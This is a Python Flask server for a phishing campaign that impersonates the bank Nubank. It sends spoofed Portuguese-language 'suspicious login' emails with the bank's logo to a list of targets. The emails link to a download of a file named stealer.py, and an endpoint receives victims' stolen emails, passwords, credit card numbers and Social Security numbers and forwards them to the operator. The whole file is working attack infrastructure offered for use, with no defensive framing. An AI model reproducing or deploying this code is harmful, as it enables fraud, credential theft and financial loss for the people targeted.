import logging
from flask import Flask, request, jsonify, send_file
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
import threading
import os
import sqlite3
import re
import platform
import requests
import json
from dotenv import load_dotenv

app = Flask(__name__)

# Load environment variables from .env file
load_dotenv()

FAKE_SENDER = os.getenv('FAKE_SENDER')
SMTP_EMAIL = os.getenv('SMTP_EMAIL')
SMTP_PASSWORD = os.getenv('SMTP_PASSWORD').replace(" ", "")
SMTP_SERVER = os.getenv('SMTP_SERVER')
SMTP_PORT = int(os.getenv('SMTP_PORT'))
LOG_FILE = os.getenv('LOG_FILE')

HTML_TEMPLATE = """
<html>
<body>
    <p>Olá,</p>
    <p>Detectamos uma tentativa de login suspeita em sua conta Nubank.</p>
    <p><strong>Para garantir sua segurança, clique no botão abaixo e confirme sua identidade:</strong></p>
    <p>
        <a href="https://{railway_url}/download" style="
            background-color: #820AD1;
            color: white;
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
        ">Confirmar Identidade</a>
    </p>
    <p>Atenciosamente,<br>Equipe Nubank</p>
    <img src="cid:nubank_logo" width="150">
</body>
</html>
"""

EMAIL_SUBJECT = "⚠️ Ação Necessária: Confirme sua Identidade"

TARGET_EMAILS = [
    "victim1@gmail.com",
    "victim2@hotmail.com",
    "victim3@outlook.com"
]

def send_phishing_email(to_email: str, railway_url: str):
    msg = MIMEMultipart()
    msg['From'] = FAKE_SENDER
    msg['To'] = to_email
    msg['Subject'] = EMAIL_SUBJECT

    html = HTML_TEMPLATE.format(railway_url=railway_url)
    msg.attach(MIMEText(html, 'html'))

    with open("nubank_logo.png", "rb") as img_file:
        img = MIMEImage(img_file.read())
        img.add_header('Content-ID', '<nubank_logo>')
        msg.attach(img)

    try:
        server = smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT)
        server.login(SMTP_EMAIL, SMTP_PASSWORD)
        server.sendmail(FAKE_SENDER, to_email, msg.as_string())
        server.quit()
        logging.info(f"[+] Phishing email sent to: {to_email}")
    except Exception as e:
        logging.error(f"[!] SMTP Error: {e}")

@app.route('/send_emails', methods=['GET'])
def send_emails():
    railway_url = request.host_url
    for email in TARGET_EMAILS:
        threading.Thread(target=send_phishing_email, args=(email, railway_url)).start()
    return jsonify({"status": "Emails sent to all targets"})

@app.route('/download', methods=['GET'])
def download_stealer():
    return send_file("stealer.py", as_attachment=True)

@app.route('/send_data', methods=['POST'])
def receive_stolen_data():
    data = request.json
    subject = f"🔴 New Victim Data ({data['system']})"
    body = f"""
    🔹 System: {data['system']}
    🔹 Emails Found: {len(data['authtoken']['emails'])}
    🔹 Passwords Found: {len(data['authtoken']['passwords'])}
    🔹 Credit Cards Found: {len(data['authtoken']['credit_cards'])}
    🔹 Social Security Numbers Found: {len(data['authtoken']['ssns'])}
    """

    msg = MIMEMultipart()
    msg['From'] = FAKE_SENDER
    msg['To'] = SMTP_EMAIL
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT)
        server.login(SMTP_EMAIL, SMTP_PASSWORD)
        text = msg.as_string()
        server.sendmail(FAKE_SENDER, SMTP_EMAIL, text)
        server.quit()
        logging.info(f"[+] Data sent to: {SMTP_EMAIL}")
    except Exception as e:
        logging.error(f"[!] Email Error: {e}")

    return jsonify({"status": "Data received"})

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "healthy"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
